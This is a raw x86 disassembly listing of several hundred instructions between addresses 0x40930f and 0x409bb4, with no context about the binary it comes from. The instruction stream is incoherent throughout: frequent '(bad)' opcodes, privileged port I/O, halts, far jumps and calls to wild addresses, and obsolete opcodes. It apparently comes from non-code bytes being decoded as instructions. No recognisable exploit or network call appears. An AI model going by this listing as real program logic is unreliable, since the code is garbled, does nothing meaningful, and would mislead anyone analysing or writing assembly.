  40930f:	cmc    
  409310:	out    0xfc,al
  409312:	retf   0xe05
  409315:	jmp    0x4092e2
  409317:	rol    ch,cl
  409319:	not    cl
  40931b:	out    0xc4,eax
  40931d:	enter  0xf1c1,0xbf
  409321:	(bad)  
  409322:	div    esi
  409324:	fxch   st(2)
  409326:	aad    0xf5
  409328:	mov    eax,0xe7e7f5cd
  40932d:	loopne 0x4092f9
  40932f:	lock fld st(7)
  409332:	add    bl,bh
  409334:	in     eax,dx
  409335:	out    0xf0,eax
  409337:	out    dx,al
  409338:	shl    eax,1
  40933a:	aad    0xf3
  40933c:	enter  0xd8fa,0xc5
  409340:	cmc    
  409341:	hlt    
  409342:	aad    0xfa
  409344:	(bad)  
  409345:	out    dx,eax
  409346:	mov    ebp,0xbbdcd5ba
  40934b:	add    edx,edi
  40934d:	fadd   DWORD PTR [esi+eax*1]
  409350:	jmp    0xf9106d5b
  409355:	stc    
  409356:	out    dx,eax
  409357:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409358:	mov    esp,0xb6f6f5e3
  40935d:	stc    
  40935e:	cli    
  40935f:	mov    dh,0xef
  409361:	jmp    0xc9146554
  409366:	cld    
  409367:	mov    esi,0xfccce7f3
  40936c:	add    DWORD PTR [ecx],eax
  40936e:	add    al,0xe0
  409370:	bswap  ecx
  409372:	(bad)  
  409373:	or     esp,eax
  409375:	int3   
  409376:	mov    bl,0xaf
  409378:	jecxz  0x409371
  40937a:	int3   
  40937b:	jecxz  0x409343
  40937d:	vshufps ymm7,ymm6,YMMWORD PTR [ecx-0x27370f41],0xee
  409386:	rcl    dl,1
  409388:	mov    esp,0x4e5decd
  40938d:	jmp    0xdc2b7f7c
  409392:	push   es
  409393:	cld    
  409394:	stc    
  409395:	int3   
  409396:	shl    edx,cl
  409398:	loopne 0x40937b
  40939a:	in     al,0xfb
  40939c:	iret   
  40939d:	out    dx,al
  40939e:	into   
  40939f:	mov    dh,0xba
  4093a1:	fsubr  st,st(7)
  4093a3:	shr    ebx,1
  4093a5:	call   0xef3a8b86
  4093aa:	cli    
  4093ab:	in     eax,0xf6
  4093ad:	retf   
  4093ae:	jmp    0x40937b
  4093b0:	push   es
  4093b1:	cld    
  4093b2:	in     eax,0xed
  4093b4:	pop    es
  4093b5:	cld    
  4093b6:	ret    
  4093b7:	loop   0x40937b
  4093b9:	mov    dl,0xc6
  4093bb:	out    dx,al
  4093bc:	cmc    
  4093bd:	mov    bh,0xfb
  4093bf:	out    0xc7,al
  4093c1:	hlt    
  4093c2:	retf   
  4093c3:	shl    ebx,cl
  4093c5:	aad    0xd6
  4093c7:	enter  0xee01,0xf1
  4093cb:	(bad)
  4093ce:	rol    DWORD PTR ds:0xc4e804fe,0xe3
  4093d5:	out    0xbe,eax
  4093d7:	test   al,0xe3
  4093d9:	mov    dl,0xd4
  4093db:	rcl    dl,0xe1
  4093de:	stc    
  4093df:	jmp    0x4093ba
  4093e1:	out    dx,eax
  4093e2:	retf   0xd5ea
  4093e5:	loope  0x4093b0
  4093e7:	lock aad 0xfb
  4093ea:	push   es
  4093eb:	jmp    0x4093c1
  4093ed:	mov    esp,0x3c9f7eb
  4093f2:	aam    0xe9
  4093f4:	fdiv   st(4),st
  4093f6:	retf   0xc9b3
  4093f9:	ror    edx,0xf3
  4093fc:	icebp  
  4093fd:	mov    dl,0xee
  4093ff:	repz fsubr st,st(4)
  409402:	(bad)  
  409404:	shl    edi,cl
  409406:	call   0xc1019bdb
  40940b:	(bad)  
  40940c:	idiv   ecx
  40940e:	test   DWORD PTR [eax],0xfe08d600
  409414:	cli    
  409415:	add    ch,BYTE PTR [ebx-0x12330f57]
  40941b:	in     eax,0xb1
  40941d:	lock rol edi,1
  409420:	retf   0xe4ce
  409423:	call   0xf5156702
  409428:	int3   
  409429:	rol    DWORD PTR [edi],0x0
  40942c:	(bad)  
  40942d:	icebp  
  40942e:	(bad)  
  409430:	cli    
  409431:	sti    
  409432:	cld    
  409433:	leave  
  409434:	int3   
  409435:	or     edx,esp
  409437:	lods   eax,DWORD PTR ds:[esi]
  409438:	idiv   BYTE PTR [esi-0x41c1031]
  40943e:	loope  0x409430
  409440:	jmp    0x3fa6b13
  409445:	sti    
  409446:	stc    
  409447:	not    cl
  409449:	hlt    
  40944a:	(bad)  
  40944b:	idiv   DWORD PTR [ecx+0x5cad5d5]
  409451:	call   0xfd4f931d
  409456:	(bad)
  409459:	mov    bl,0xcf
  40945b:	aam    0xf6
  40945d:	iret   
  40945e:	stc    
  40945f:	mov    eax,0xf6caddd6
  409464:	std    
  409465:	ret    0xd7f9
  409468:	sar    DWORD PTR [eax-0x341502fa],1
  40946e:	add    al,0xf0
  409470:	retf   
  409471:	(bad)  
  409473:	out    0xe7,al
  409475:	les    esi,FWORD PTR [ebx-0x152d522e]
  40947b:	rcl    esi,1
  40947d:	icebp  
  40947e:	in     al,0xed
  409480:	in     eax,0xb8
  409482:	(bad)  
  409484:	div    edx
  409486:	std    
  409487:	mov    edx,0xdff5e502
  40948c:	in     eax,0x3
  40948e:	or     BYTE PTR [esi],al
  409490:	loop   0x409476
  409492:	add    BYTE PTR [ebx],dl
  409494:	pop    es
  409495:	fsubr  st,st(5)
  409497:	rol    dh,1
  409499:	in     eax,0xc0
  40949b:	icebp  
  40949c:	fnsetpm(287 only) 
  40949e:	sar    BYTE PTR [eax-0x310c2b15],cl
  4094a4:	add    ebp,eax
  4094a6:	out    dx,al
  4094a7:	xlat   BYTE PTR ds:[ebx]
  4094a8:	cli    
  4094a9:	repz out 0xf1,eax
  4094ac:	repz or ecx,esp
  4094af:	loope  0x4094ba
  4094b1:	or     bl,ah
  4094b3:	fucomp st(4)
  4094b5:	inc    edi
  4094b7:	repz in eax,dx
  4094b9:	int    0xe9
  4094bb:	sti    
  4094bc:	mov    bl,0xce
  4094be:	mov    bh,0xb2
  4094c0:	(bad)  
  4094c1:	retf   
  4094c2:	mov    ch,0xd8
  4094c4:	cmc    
  4094c5:	std    
  4094c6:	mov    eax,0xedd0fd
  4094cb:	pop    es
  4094cc:	mov    BYTE PTR [eax],0x1
  4094cf:	sidtd  [edx]
  4094d2:	jmp    0x4094c7
  4094d4:	stc    
  4094d5:	or     eax,0xecbcd2e1
  4094da:	repz retf 0xe4b3
  4094de:	mov    ch,0xc5
  4094e0:	jmp    0xe0b8:0x3c9cdf9
  4094e7:	stc    
  4094e8:	loopne 0x4094cf
  4094ea:	add    dl,ah
  4094ec:	cli    
  4094ed:	cld    
  4094ee:	push   es
  4094ef:	(bad)  
  4094f1:	(bad)  
  4094f3:	or     al,0x3
  4094f5:	or     eax,ebx
  4094f7:	(bad)  
  4094f8:	in     al,dx
  4094f9:	shl    DWORD PTR [edi-0x37312b56],0xe7
  409500:	in     eax,0xc9
  409502:	mov    ah,0xea
  409504:	std    
  409505:	ret    
  409506:	repnz loopne 0x4094be
  409509:	loopne 0x4094f7
  40950b:	rcr    bl,0xf5
  40950e:	cli    
  40950f:	(bad)  
  409511:	push   es
  409512:	int    0x1
  409514:	int    0x4
  409516:	fmul   st,st(3)
  409518:	in     eax,dx
  409519:	(bad)  
  40951a:	retf   0xfbcc
  40951d:	shr    DWORD PTR [edi-0x1b304948],1
  409523:	mov    eax,0xbfb8f7ba
  409528:	(bad)  
  409529:	repnz sar eax,1
  40952c:	(bad)  
  40952d:	jmp    0x1279809
  409532:	add    al,0xc9
  409534:	fdivr  st,st(7)
  409536:	mov    esi,0xc7c2c1e8
  40953b:	in     eax,dx
  40953c:	jmp    0xb13c8d16
  409541:	sti    
  409542:	cli    
  409543:	mov    edi,0xccfaefbd
  409548:	repz push es
  40954a:	sti    
  40954b:	(bad)  
  40954c:	out    0x3,eax
  40954e:	add    eax,0xfddcf8e7
  409553:	or     ebx,ecx
  409555:	jmp    0xe42e7436
  40955a:	in     al,0xd2
  40955c:	retf   
  40955d:	out    0xb2,al
  40955f:	in     eax,0xb8
  409561:	fcmovnbe st,st(5)
  409563:	clc    
  409564:	shr    esi,cl
  409566:	add    dh,al
  409568:	mov    esi,0xfefc01db
  40956d:	mov    eax,0xeec5dc03
  409572:	clc    
  409573:	fchs   
  409575:	in     eax,dx
  409576:	fnop   
  409578:	loope  0x409545
  40957a:	ret    0xe8b4
  40957d:	(bad)
  409580:	mov    eax,0xd2fbd1f1
  409585:	jmp    0xffbf:0x3d8dbda
  40958c:	mov    esp,0xdac4c2fc
  409591:	cli    
  409592:	in     eax,0xc2
  409594:	loopne 0x409585
  409596:	in     eax,dx
  409597:	test   al,0xe5
  409599:	out    dx,eax
  40959a:	shl    DWORD PTR [ebx-0x4b041919],cl
  4095a0:	icebp  
  4095a1:	mov    ah,0xc4
  4095a3:	mov    ebx,0xfefed6cb
  4095a8:	iret   
  4095a9:	mov    ebp,0xc6f9ccec
  4095ae:	(bad)  
  4095b0:	(bad)  
  4095b2:	jmp    0xae0d6e91
  4095b7:	fsub   st(7),st
  4095b9:	lods   al,BYTE PTR ds:[esi]
  4095ba:	jmp    0xf0e9:0xedc6acd4
  4095c1:	mov    edi,0xecded0fe
  4095c6:	add    esi,ebx
  4095c8:	rcr    ecx,0xda
  4095cb:	shl    bl,0xf1
  4095ce:	fild   WORD PTR [edx]
  4095d0:	out    dx,eax
  4095d1:	add    al,BYTE PTR [edi]
  4095d3:	fiadd  DWORD PTR [ebx]
  4095d5:	out    dx,eax
  4095d6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4095d7:	iret   
  4095d8:	jmp    0x409587
  4095da:	lods   eax,DWORD PTR ds:[esi]
  4095db:	out    dx,eax
  4095dc:	int3   
  4095dd:	repnz mov ebx,0xdcf8fec7
  4095e3:	fxch   st(7)
  4095e5:	mov    edx,0xdc07d202
  4095ea:	push   es
  4095eb:	(bad)  
  4095ec:	loop   0x4095e7
  4095ee:	jmp    0x4095e0
  4095f0:	(bad)  
  4095f1:	(bad)  
  4095f2:	loop   0x4095fa
  4095f4:	jmp    0x4095e8
  4095f6:	iret   
  4095f7:	scas   eax,DWORD PTR es:[edi]
  4095f8:	lods   al,BYTE PTR ds:[esi]
  4095f9:	loope  0x4095a6
  4095fb:	call   0xba2971d2
  409600:	leave  
  409601:	in     eax,0xbb
  409603:	(bad)  
  409604:	iret   
  409605:	std    
  409606:	jecxz  0x409605
  409608:	(bad)  
  409609:	(bad)  
  40960a:	repz rcr ebx,1
  40960d:	fadd   st(3),st
  40960f:	out    0xc8,al
  409611:	aam    0x1
  409613:	enter  0xeee0,0xc9
  409617:	shl    BYTE PTR [ecx-0x1b36500a],0xd7
  40961e:	fcmovne st,st(6)
  409620:	mov    edi,0xd8b2ffb8
  409625:	neg    ecx
  409627:	repz ror dh,1
  40962a:	(bad)  
  40962b:	fstp   st(2)
  40962d:	loop   0x409603
  40962f:	add    cl,BYTE PTR [ecx]
  409631:	iret   
  409632:	loope  0x40963e
  409634:	add    BYTE PTR [ebx],cl
  409636:	(bad)
  409639:	ror    ecx,0xf7
  40963c:	(bad)  
  40963d:	mov    ch,0xea
  40963f:	in     al,dx
  409640:	xlat   BYTE PTR ds:[ebx]
  409641:	hlt    
  409642:	lock iret 
  409644:	mov    edi,0xed0702be
  409649:	mov    ebp,0x9f206e4
  40964e:	add    eax,0x6fdd6d8
  409653:	aam    0xfa
  409655:	rol    bh,0xf0
  409658:	loope  0x40962a
  40965a:	mov    ch,0xb5
  40965c:	les    esi,FWORD PTR [eax-0x25360830]
  409662:	sti    
  409663:	mov    ecx,0xd5fdc3be
  409668:	aam    0x0
  40966a:	int3   
  40966b:	loopne 0x409667
  40966d:	fcmovnb st,st(5)
  40966f:	lock add eax,0xf9ccc3dd
  409675:	std    
  409676:	stos   BYTE PTR es:[edi],al
  409677:	(bad)  
  409678:	mov    bl,0xe2
  40967a:	jmp    0x409645
  40967c:	mov    dh,0xb4
  40967e:	out    0xce,al
  409680:	jmp    0x40964d
  409682:	rcr    esi,cl
  409684:	rol    DWORD PTR [ecx],1
  409686:	hlt    
  409687:	sar    dl,1
  409689:	in     eax,dx
  40968a:	add    edx,edi
  40968c:	push   es
  40968d:	out    0xe0,al
  40968f:	in     eax,0xda
  409691:	psubb  mm5,mm4
  409694:	retf   0xb8ed
  409697:	fbld   TBYTE PTR [ebp-0xd1d1237]
  40969d:	(bad)  
  40969e:	into   
  40969f:	in     al,dx
  4096a0:	lock mov ebx,0xc9cfd7cc
  4096a6:	clc    
  4096a7:	loope  0x409686
  4096a9:	ret    
  4096aa:	lds    edi,FWORD PTR [ebp-0x270e1803]
  4096b0:	clc    
  4096b1:	cli    
  4096b2:	add    ah,bl
  4096b4:	sti    
  4096b5:	in     eax,0xab
  4096b7:	loope  0x40969a
  4096b9:	mov    bl,0xae
  4096bb:	loopne 0x409693
  4096bd:	out    dx,al
  4096be:	jmp    0x4096b9
  4096c0:	mov    al,0xb7
  4096c2:	sti    
  4096c3:	call   0xfa3a7893
  4096c8:	fcmovb st,st(3)
  4096ca:	ret    
  4096cb:	neg    al
  4096cd:	add    bh,ah
  4096cf:	add    eax,0xaf50f0e
  4096d4:	or     al,0xb
  4096d6:	out    dx,eax
  4096d7:	mov    bl,0xb2
  4096d9:	jmp    0xd2f363a2
  4096de:	mov    ebx,0xb5dfb6f5
  4096e3:	add    esi,DWORD PTR [ecx+0x6c0f7bc]
  4096e9:	out    0xf5,al
  4096eb:	lock ffreep st(4)
  4096ee:	leave  
  4096ef:	(bad)  
  4096f0:	stc    
  4096f1:	out    dx,al
  4096f2:	or     BYTE PTR ds:0xe0b2cd0f,cl
  4096f8:	mov    bl,0xf2
  4096fa:	int3   
  4096fb:	lock rcr edx,0xc9
  4096ff:	mov    ebx,0xfcfdb8ed
  409704:	add    edx,edi
  409706:	int3   
  409707:	mov    esi,0xe2bff5ce
  40970c:	(bad)  
  40970d:	add    ah,al
  40970f:	test   BYTE PTR [edx],0xe6
  409712:	out    0xfd,al
  409714:	adc    ah,dh
  409716:	test   eax,0xebeec7f0
  40971b:	in     al,dx
  40971c:	mov    dh,0xc8
  40971e:	jmp    0x117cf3
  409723:	mov    ebp,0xf8d0fcfd
  409728:	aad    0xd3
  40972a:	mov    ebp,0xf0ca0a01
  40972f:	pop    es
  409730:	jmp    0xed498c42
  409735:	(bad)  
  409737:	call   0xb6176aea
  40973c:	fcmovbe st,st(7)
  40973e:	rol    bh,cl
  409740:	vpmuludq ymm5,ymm2,ymm3
  409744:	fidivr DWORD PTR [ebx-0x13230918]
  40974a:	clc    
  40974b:	fcmovnbe st,st(3)
  40974d:	ret    0xc101
  409750:	aam    0xe0
  409752:	add    esi,edi
  409754:	prefetchwt1 (bad)
  409755:	or     eax,0xc5bfddd3
  40975a:	xlat   BYTE PTR ds:[ebx]
  40975b:	shl    al,1
  40975d:	cli    
  40975e:	shr    ebp,1
  409760:	fcmovne st,st(2)
  409762:	repz mov ch,0xd6
  409765:	(bad)  
  409767:	aad    0xd7
  409769:	aam    0xc1
  40976b:	add    eax,0xf4c5cae7
  409770:	faddp  st(4),st
  409772:	pop    es
  409773:	into   
  409774:	add    al,BYTE PTR [esi]
  409776:	loope  0x409749
  409778:	ret    
  409779:	not    dh
  40977b:	mov    bl,0xc2
  40977d:	aam    0xee
  40977f:	(bad)  
  409780:	fcmovb st,st(6)
  409782:	mov    edx,0xf3cdb1db
  409787:	std    
  409788:	inc    DWORD PTR ds:0xdef905df
  40978e:	pop    es
  40978f:	neg    esi
  409791:	or     eax,0xc0ce02f8
  409796:	loop   0x40978b
  409798:	loope  0x40974a
  40979a:	shl    BYTE PTR [esi-0x152f2419],0xbf
  4097a1:	mov    esi,0xcfd9dff3
  4097a6:	(bad)  
  4097a8:	mul    ebx
  4097aa:	lock (bad) 
  4097ac:	jmp    0x409772
  4097ae:	loopne 0x409794
  4097b0:	enter  0xada,0x3
  4097b4:	or     dl,BYTE PTR [ebx]
  4097b6:	int    0xc2
  4097b8:	in     al,0xd2
  4097ba:	out    0xc6,eax
  4097bc:	ror    dh,0xe9
  4097bf:	aad    0xfb
  4097c1:	out    0xfa,al
  4097c3:	fcompp 
  4097c5:	call   0xdf3973bb
  4097ca:	lock test bl,0xc3
  4097ce:	shr    eax,1
  4097d0:	mul    esp
  4097d2:	out    0xfe,eax
  4097d4:	adc    bh,dl
  4097d6:	rcl    edi,0xe2
  4097d9:	into   
  4097da:	lods   eax,DWORD PTR ds:[esi]
  4097db:	aam    0xac
  4097dd:	shr    ebp,cl
  4097df:	out    dx,al
  4097e0:	mov    bh,0xf4
  4097e2:	fscale 
  4097e4:	lock fadd st,st(3)
  4097e7:	fcomp  st(4)
  4097e9:	int3   
  4097ea:	push   es
  4097eb:	push   es
  4097ec:	ret    0xd404
  4097ef:	jmp    0xfd4e7af2
  4097f4:	loopne 0x4097d0
  4097f6:	icebp  
  4097f7:	not    edx
  4097f9:	jmp    0x4097c9
  4097fb:	into   
  4097fc:	loopne 0x4097c7
  4097fe:	icebp  
  4097ff:	repnz fdivp st(6),st
  409802:	xlat   BYTE PTR ds:[ebx]
  409803:	out    dx,eax
  409804:	jmp    0xbcfc:0xeccdddfc
  40980b:	(bad)  
  40980c:	or     bl,ch
  40980e:	or     esp,esi
  409810:	hlt    
  409811:	fsubrp st(2),st
  409813:	int3   
  409814:	repz adc ebp,edx
  409817:	out    dx,eax
  409818:	in     eax,0xb1
  40981a:	jmp    0xf7176ce3
  40981f:	(bad)  
  409820:	fsin   
  409822:	jmp    0xf5fd7c21
  409827:	shl    eax,1
  409829:	neg    bl
  40982b:	mov    edx,0xc0e40900
  409830:	std    
  409831:	mov    esp,0xdaecd907
  409836:	stos   BYTE PTR es:[edi],al
  409837:	jmp    0xc4084506
  40983c:	mov    dh,0xf9
  40983e:	scas   eax,DWORD PTR es:[edi]
  40983f:	scas   al,BYTE PTR es:[edi]
  409840:	enter  0xf7b0,0xc9
  409844:	loop   0x409818
  409846:	mov    edi,0xbb06bdd3
  40984b:	rol    ch,cl
  40984d:	add    al,BYTE PTR [ecx]
  40984f:	fcmovnu st,st(6)
  409851:	fisttp DWORD PTR [edx]
  409853:	(bad)  
  409855:	push   cs
  409856:	jmp    0x409838
  409858:	scas   eax,DWORD PTR es:[edi]
  409859:	(bad)  
  40985a:	out    0xb4,al
  40985c:	jmp    0xf0d8:0xb4fbb9ca
  409863:	cmc    
  409864:	rcl    bl,cl
  409866:	iret   
  409867:	cli    
  409868:	fnsave [ebp+ebp*8-0x18fc2e15]
  40986f:	enter  0xc6e6,0xc7
  409873:	in     eax,dx
  409874:	in     al,dx
  409875:	fisubr WORD PTR [ebx-0x82f1029]
  40987b:	mov    bl,0xe5
  40987d:	mov    bl,0xd6
  40987f:	push   eax
  409881:	clc    
  409882:	shl    al,cl
  409884:	shl    bl,1
  409886:	hlt    
  409887:	int3   
  409888:	loop   0x40988d
  40988a:	call   ebp
  40988c:	or     ah,bh
  40988e:	fmul   st(1),st
  409890:	add    eax,0xc5e4ead5
  409895:	or     al,0xde
  409897:	in     al,dx
  409898:	in     al,dx
  409899:	fsubrp st(7),st
  40989b:	leave  
  40989c:	mov    dh,0xed
  40989e:	mov    bl,0xf6
  4098a0:	ror    ebx,cl
  4098a2:	fcmovnu st,st(2)
  4098a4:	aam    0xb9
  4098a6:	jecxz  0x40989d
  4098a8:	(bad)  
  4098aa:	rol    BYTE PTR [eax],0xf5
  4098ad:	mov    eax,0xf805df01
  4098b2:	pop    es
  4098b3:	aam    0xc5
  4098b5:	or     eax,0xedbde5a9
  4098ba:	aam    0xd7
  4098bc:	mov    ch,0xd9
  4098be:	in     al,0xfb
  4098c0:	jmp    0xf6cc:0xceb2f9b6
  4098c7:	in     eax,dx
  4098c8:	mov    ecx,0xc6f1ffe2
  4098cd:	retf   
  4098ce:	icebp  
  4098cf:	add    cl,cl
  4098d1:	or     bl,bl
  4098d3:	add    eax,0xe6e1e0cd
  4098d8:	mov    cl,0xb6
  4098da:	rol    bh,1
  4098dc:	shl    ecx,cl
  4098de:	jmp    0xd41e5fd3
  4098e3:	(bad)  
  4098e5:	iret   
  4098e6:	int    0xda
  4098e8:	mov    eax,0xafdbee5
  4098ed:	(bad)  
  4098ef:	lds    eax,FWORD PTR [esi]
  4098f1:	(bad)  
  4098f2:	fcomip st,st(3)
  4098f4:	std    
  4098f5:	clc    
  4098f6:	ret    
  4098f7:	loope  0x4098ef
  4098f9:	jmp    0xe5ea5dbe
  4098fe:	icebp  
  4098ff:	fcmovne st,st(1)
  409901:	retf   0xf7bb
  409904:	mov    esi,0xd2d7e8ce
  409909:	jecxz  0x4098f0
  40990b:	(bad)
  40990e:	idiv   esp
  409910:	fisttp QWORD PTR [ecx]
  409912:	std    
  409913:	add    dh,ch
  409915:	pop    es
  409916:	ret    0xd1f0
  409919:	repz aam 0xdb
  40991c:	shl    al,1
  40991e:	out    dx,al
  40991f:	in     eax,dx
  409920:	ror    esi,cl
  409922:	mov    ebp,0xedfff7b5
  409927:	mov    ecx,0xe4f7d8dc
  40992c:	xlat   BYTE PTR ds:[ebx]
  40992d:	push   es
  40992e:	stc    
  40992f:	loop   0x40991b
  409931:	or     eax,DWORD PTR ds:0xc3e6e8ee
  409937:	iret   
  409938:	lock rol edx,cl
  40993b:	mov    dl,0xd3
  40993d:	out    0xe0,eax
  40993f:	fcomp  st(6)
  409941:	mov    edx,0xbeebcdeb
  409946:	mov    ebx,0xddc1d0cc
  40994b:	(bad)
  40994e:	cmc    
  40994f:	or     ebx,ecx
  409951:	add    al,0xca
  409953:	loope  0x409934
  409955:	or     eax,0xc4dce8c5
  40995a:	out    dx,eax
  40995b:	(bad)
  40995e:	shl    DWORD PTR [ecx+ecx*8-0x162e1405],1
  409965:	aam    0xbe
  409967:	rol    BYTE PTR [esi],1
  409969:	mov    eax,0x1c7f5c2
  40996e:	call   0x61e7868
  409973:	out    dx,eax
  409974:	iret   
  409975:	into   
  409976:	out    0xe2,eax
  409978:	(bad)  
  40997a:	iret   
  40997b:	repnz out dx,al
  40997d:	out    dx,al
  40997e:	in     al,dx
  40997f:	fldcw  WORD PTR [ebp-0x340a2c3c]
  409985:	clc    
  409986:	mov    edx,0xdaf3bdb8
  40998b:	fcompp 
  40998d:	cld    
  40998e:	fcomp  st(4)
  409990:	(bad)  
  409991:	enter  0xe80e,0xf3
  409995:	into   
  409996:	mov    esp,0xc7b0b3a9
  40999b:	mov    bh,0xc6
  40999d:	into   
  40999e:	int    0xf3
  4099a0:	fdiv   st,st(1)
  4099a2:	mov    eax,0xdddebdbd
  4099a7:	sar    ebp,0x6
  4099aa:	fiadd  DWORD PTR [ebx]
  4099ac:	mov    ebp,0xf9ded60a
  4099b1:	or     dl,ch
  4099b3:	add    ch,al
  4099b5:	or     ebp,edx
  4099b7:	in     al,dx
  4099b8:	mov    esp,0xcfe4b0c6
  4099bd:	lds    edi,FWORD PTR [ecx-0x21003035]
  4099c3:	jecxz  0x40998f
  4099c5:	jecxz  0x4099bc
  4099c7:	mov    esp,0x2dbe1b5
  4099cc:	add    al,BYTE PTR [ecx]
  4099ce:	jecxz  0x4099d2
  4099d0:	fdiv   st(4),st
  4099d2:	in     eax,dx
  4099d3:	jmp    0xeeeb:0xcbdf02e6
  4099da:	mov    dh,0xb4
  4099dc:	cli    
  4099dd:	sar    DWORD PTR [ebx-0x4c321850],cl
  4099e3:	(bad)  
  4099e4:	retf   0xdaee
  4099e7:	(bad)  
  4099e8:	stc    
  4099e9:	rcr    edi,1
  4099eb:	ffreep st(6)
  4099ed:	hlt    
  4099ee:	add    ah,dl
  4099f0:	out    dx,eax
  4099f1:	out    dx,eax
  4099f2:	or     edi,esp
  4099f4:	into   
  4099f5:	or     cl,ah
  4099f7:	fdiv   QWORD PTR [ebx-0x2c4f0d3e]
  4099fd:	cli    
  4099fe:	loopne 0x4099ed
  409a00:	mov    dh,0xda
  409a02:	(bad)  
  409a04:	fsub   st(1),st
  409a06:	loope  0x409a06
  409a08:	div    BYTE PTR [esi+edi*4-0x33c0025]
  409a0f:	les    eax,FWORD PTR [ecx]
  409a11:	add    al,0xfc
  409a13:	les    eax,FWORD PTR ds:0xced0c0eb
  409a19:	in     al,dx
  409a1a:	out    dx,al
  409a1b:	fsub   st(6),st
  409a1d:	enter  0xb9b0,0xcc
  409a21:	(bad)
  409a24:	jmp    0xe0f797e5
  409a29:	out    0xfa,al
  409a2b:	(bad)  
  409a2c:	cli    
  409a2d:	fucom  st(5)
  409a2f:	(bad)  
  409a30:	fmul   DWORD PTR [ecx]
  409a32:	lds    ecx,FWORD PTR [edx]
  409a34:	loope  0x409a41
  409a36:	rcl    ecx,0xeb
  409a39:	rcr    ah,1
  409a3b:	out    dx,eax
  409a3c:	rcr    dl,0xcd
  409a3f:	scas   al,BYTE PTR es:[edi]
  409a40:	mov    cl,0xef
  409a42:	fsubp  st(6),st
  409a44:	(bad)  
  409a46:	call   0xf847753b
  409a4b:	(bad)  
  409a4d:	std    
  409a4e:	test   DWORD PTR [ecx],0xc800dbe3
  409a54:	fucomip st,st(3)
  409a56:	mov    esi,0xe7c0c7d1
  409a5b:	test   bh,0xe0
  409a5e:	test   ah,0xb9
  409a61:	mov    edi,0xbedffde4
  409a66:	cli    
  409a67:	loopne 0x409a26
  409a69:	out    0x4,eax
  409a6b:	std    
  409a6c:	mul    bl
  409a6e:	(bad)  
  409a6f:	(bad)  
  409a70:	hlt    
  409a71:	add    DWORD PTR [eax],eax
  409a73:	in     eax,0xe6
  409a75:	or     edi,DWORD PTR [esi-0x3234093d]
  409a7b:	mov    bh,0xf1
  409a7d:	enter  0xfae6,0xb1
  409a81:	aad    0xd2
  409a83:	shl    ecx,cl
  409a85:	(bad)  
  409a87:	ret    0xdad9
  409a8a:	std    
  409a8b:	shl    cl,cl
  409a8d:	aad    0xd7
  409a8f:	xlat   BYTE PTR ds:[ebx]
  409a90:	(bad)  
  409a91:	call   0xeb1c9298
  409a96:	jmp    0x409a54
  409a98:	into   
  409a99:	retf   
  409a9a:	aad    0xee
  409a9c:	jmp    0xf8204e87
  409aa1:	(bad)  
  409aa3:	retf   
  409aa4:	jecxz  0x409a9f
  409aa6:	(bad)  
  409aa8:	shl    ch,0xdf
  409aab:	(bad)
  409aae:	call   0xfe089e92
  409ab3:	or     dl,BYTE PTR [ebx]
  409ab5:	adc    ecx,ebp
  409ab7:	int3   
  409ab8:	lods   al,BYTE PTR ds:[esi]
  409ab9:	xlat   BYTE PTR ds:[ebx]
  409aba:	in     eax,0xe9
  409abc:	loopne 0x409ab9
  409abe:	mov    al,0xcc
  409ac0:	retf   0xffb4
  409ac3:	aad    0xb5
  409ac5:	xlat   BYTE PTR ds:[ebx]
  409ac6:	add    dl,al
  409ac8:	cld    
  409ac9:	fyl2x  
  409acb:	shr    dl,cl
  409acd:	fsub   st(0),st
  409acf:	push   es
  409ad0:	clc    
  409ad1:	jmp    0xb3c9:0xcad3e3f8
  409ad8:	int    0xea
  409ada:	lds    esi,FWORD PTR [ecx-0x39131b34]
  409ae0:	retf   
  409ae1:	in     eax,0xd7
  409ae3:	hlt    
  409ae4:	cli    
  409ae5:	shr    ebp,cl
  409ae7:	add    edi,DWORD PTR [eax+0xf1f8dc]
  409aed:	add    esp,edi
  409aef:	enter  0xb07,0x6
  409af3:	fld    QWORD PTR [ecx+esi*8]
  409af6:	shl    ch,1
  409af8:	scas   eax,DWORD PTR es:[edi]
  409af9:	in     al,0xf2
  409afb:	scas   al,BYTE PTR es:[edi]
  409afc:	int3   
  409afd:	ret    0xe6cc
  409b00:	mov    ch,0xc9
  409b02:	not    bl
  409b04:	fucomi st,st(5)
  409b06:	into   
  409b07:	mov    esi,0x701c6ee
  409b0c:	push   es
  409b0d:	mov    eax,0xbcc6c6de
  409b12:	loope  0x409b22
  409b14:	stc    
  409b15:	iret   
  409b16:	out    0xae,al
  409b18:	rol    al,1
  409b1a:	in     al,0xe5
  409b1c:	retf   
  409b1d:	retf   0xb0ec
  409b20:	jmp    0xf80a96ef
  409b25:	lock fsubr st(1),st
  409b28:	mov    ebp,0xd7c3fedf
  409b2d:	(bad)  
  409b2e:	(bad)  
  409b2f:	or     esp,ebp
  409b31:	push   cs
  409b32:	retf   0xcee6
  409b35:	clc    
  409b36:	lock (bad) [esi-0x1d2c2210]
  409b3d:	test   al,0xf2
  409b3f:	hlt    
  409b40:	in     eax,0xf1
  409b42:	mov    esi,0xe3d4e9be
  409b47:	out    0xe2,eax
  409b49:	rol    bh,cl
  409b4b:	mov    esp,0x304fcdc
  409b50:	(bad)  
  409b51:	hlt    
  409b52:	jmp    0x409b51
  409b54:	into   
  409b55:	fild   QWORD PTR [eax-0x1e381150]
  409b5b:	loop   0x409b25
  409b5d:	(bad)  
  409b5e:	(bad)  
  409b5f:	mov    edx,0xd0b4f2ef
  409b64:	(bad)  
  409b66:	(bad)  
  409b67:	int    0xf1
  409b69:	ret    
  409b6a:	loope  0x409b42
  409b6c:	jmp    0x40e:0xd7f6c0b8
  409b73:	push   es
  409b74:	lds    eax,FWORD PTR [ecx]
  409b76:	call   0xec258a27
  409b7b:	mov    ah,0xe3
  409b7d:	neg    dl
  409b7f:	call   0xf105615c
  409b84:	mov    ecx,0xe2efe3d0
  409b89:	mov    esi,0xd70bd1d8
  409b8e:	or     al,BYTE PTR [edi]
  409b90:	retf   
  409b91:	(bad)  
  409b93:	in     al,0xc4
  409b95:	in     eax,0xbf
  409b97:	out    0xe8,al
  409b99:	retf   0xb0ea
  409b9c:	loope  0x409b86
  409b9e:	(bad)  
  409b9f:	hlt    
  409ba0:	call   0xd40c7b76
  409ba5:	call   esi
  409ba7:	add    cl,al
  409ba9:	stc    
  409baa:	inc    DWORD PTR [edx*8-0x6092303]
  409bb1:	pmuludq mm0,QWORD PTR [ebx]
  409bb4:	add    al,0xa
